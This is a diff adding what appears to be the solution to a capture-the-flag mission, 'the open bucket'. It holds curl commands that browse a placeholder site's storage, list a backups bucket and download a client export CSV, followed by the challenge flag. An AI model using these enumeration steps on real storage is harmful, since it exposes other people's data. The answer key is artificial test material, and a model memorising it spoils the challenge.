@@ -1,0 +1,7 @@
+# Season 6, mission 1: the open bucket
+curl https://www.alto.test/
+curl https://storage.alto.test/
+curl https://storage.alto.test/alto-backups/
+curl https://storage.alto.test/alto-backups/export-clients.csv
+submit FLAG{alto-open-bucket-52c8}
+answer setting
